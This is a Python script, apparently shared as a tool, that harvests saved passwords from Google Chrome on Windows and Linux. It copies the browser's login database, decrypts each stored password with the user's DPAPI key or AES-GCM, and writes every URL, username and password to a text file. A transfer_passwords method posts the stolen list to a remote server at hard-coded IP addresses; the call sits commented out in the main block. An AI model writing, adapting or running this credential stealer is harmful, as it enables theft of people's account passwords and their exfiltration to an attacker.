# !/usr/bin/python3
# @File: GetPassword_80_ver.py
# --coding:utf-8--
# @Author:kinni
# @Time:  2020年04月02日 11:20:32
# 说明:


import os
import sys
import  shutil
import  sqlite3
import  win32crypt
import json,base64
import requests
import aesgcm

APP_DATA_PATH= os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'


def dpapi_decrypt(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def unix_decrypt(encrypted):
    if sys.platform.startswith('linux'):
        password = 'peanuts'
        iterations = 1
    else:
        raise NotImplementedError

    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2

    salt = 'saltysalt'
    iv = ' ' * 16
    length = 16
    key = PBKDF2(password, salt, length, iterations)
    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    decrypted = cipher.decrypt(encrypted[3:])
    return decrypted[:-ord(decrypted[-1])]

def get_key_from_local_state():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'],
        r"Google\Chrome\User Data\Local State"),encoding='utf-8',mode ="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

def aes_decrypt(encrypted_txt):
    encoded_key = get_key_from_local_state()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi_decrypt(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = aesgcm.get_cipher(key)
    return aesgcm.decrypt(cipher,encrypted_txt[15:],nonce)

class ChromePassword:
    def __init__(self):
        self.passwordList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path,_temp_path)
        self.show_password(_temp_path)

    def show_password(self,db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            # print(type(row[2]))
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.chrome_decrypt(row[2])######加密方式改變后的重點位置
            #密码解析后得到字节码，需要进行解码操作
            _info = 'url:%-40s username:%-20s password:%s\n' %(host,name,value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def chrome_decrypt(self,encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi_decrypt(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = aes_decrypt(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            try:
                return unix_decrypt(encrypted_txt)
            except NotImplementedError:
                return None

    def save_passwords(self):
        with open('password.txt','w',encoding='utf-8') as f:
            f.writelines(self.passwordList)

    def transfer_passwords(self):#可用於將保存好的密碼文件發給你
        try:
            #远程Flask对应的IP:PORT
            requests.post('http://192.168.50.80:9999/index',data=json.dumps(self.passwordList))
            # requests.post('http://125.36.118.253:9999/index', data=json.dumps(self.passwordList))
        except requests.exceptions.ConnectionError:
            pass


if __name__=="__main__":
    Main = ChromePassword()
    Main.get_chrome_db()
    Main.save_passwords()
   # Main.transfer_passwords()


